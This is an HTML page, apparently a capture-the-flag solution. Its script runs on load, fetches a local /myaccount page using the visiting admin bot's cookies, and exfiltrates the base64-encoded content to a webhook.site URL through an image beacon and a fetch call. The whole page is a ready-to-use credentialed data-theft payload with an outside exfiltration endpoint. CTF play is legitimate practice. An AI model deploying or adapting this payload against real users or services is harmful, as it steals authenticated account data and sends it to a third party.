<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Please wait...</h1>
    <script>
        // CTF Solver - Cari Bini Admin
        // This page fetches the admin's /myaccount page and exfiltrates the flag
        
        // IMPORTANT: Replace this with your webhook.site UUID
        const WEBHOOK_UUID = "b04e6414-8b97-4db3-ad8e-026a0fa00773";
        const WEBHOOK_URL = "https://webhook.site/" + WEBHOOK_UUID;
        
        // The bot has --disable-web-security, so we can fetch from 127.0.0.1:9090
        // even though we're on a different origin (github.io)
        
        (async function() {
            try {
                // Fetch admin's account page - the bot has admin cookies for 127.0.0.1:9090
                const resp = await fetch('http://127.0.0.1:9090/myaccount', {
                    credentials: 'include'
                });
                const html = await resp.text();
                
                // Exfiltrate via GET request (works even with CORS issues)
                // Using Image for reliability
                new Image().src = WEBHOOK_URL + '?flag=' + btoa(html);
                
                // Also try fetch as backup
                await fetch(WEBHOOK_URL + '?data=' + btoa(html), { mode: 'no-cors' });
                
                document.body.innerHTML = '<h1>Done! Check webhook.</h1>';
            } catch(e) {
                // Send error to webhook for debugging
                new Image().src = WEBHOOK_URL + '?error=' + btoa(e.toString());
                document.body.innerHTML = '<h1>Error: ' + e.message + '</h1>';
            }
        })();
    </script>
</body>
</html>
